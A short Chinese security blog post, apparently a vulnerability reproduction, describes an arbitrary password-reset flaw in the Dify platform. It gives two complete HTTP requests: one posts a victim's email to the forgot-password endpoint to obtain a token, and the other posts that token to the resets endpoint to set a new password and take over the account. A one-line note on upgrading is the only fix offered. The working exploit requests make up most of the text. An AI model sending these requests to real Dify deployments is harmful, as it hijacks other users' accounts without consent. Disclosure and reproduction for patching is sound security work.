#  【漏洞复现】dify任意密码重置   
yzcrnx  安全鸭   2025-05-28 10:49  
  
原文：https://github.com/langgenius/dify/issues/18114  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/flBFrCh5pNZiaqzbAUYeicUrHJRxoAEFFoibRfnuVne5lM3iakVgcJBLO7cqMmhgneYcH3zfXlgYz6W4iaqaJiaPfJFg/640?wx_fmt=png&from=appmsg "")  
  
瞎逛GitHub的时候发现dify新出一个漏洞，任意密码重置实现任意用户接管。通过调用api完成任意用户密码重置，简单复现如下：  
  
1. 获取token  
```
POST /console/api/forgot-password HTTP/1.1
Host: dify.xxx.com
Content-Type: application/json

{"email":"test@qq.com","language":"zh-Hans"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/flBFrCh5pNZiaqzbAUYeicUrHJRxoAEFFoUNib2ttkic7ZN7TZv09b4SQHTWiaUHXic0FsSPmPK4YatEVJfG9aZHNIicQ/640?wx_fmt=png&from=appmsg "")  
  
  
2. 重置密码  
  
上面接口拿到token，直接入参到resets进行密码重置操作  
```
POST /console/api/forgot-password/resets HTTP/1.1
Host: dify.xxx.com

{"token": "029f0e0f-3b46-4aab-9ef5-eba0dc66e58c","new_password":"AAa1234567","password_confirm":"AAa1234567"}
```  
  
完成重置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/flBFrCh5pNZiaqzbAUYeicUrHJRxoAEFFoIFsnJqaxHRD9x8thblOMBZQ0ic1BX5LmCQPK1Eyr5AxNqrYt8CVgZpg/640?wx_fmt=png&from=appmsg "")  
  
修复方案：目前新版本已经修复，部署新版本即可。  
  
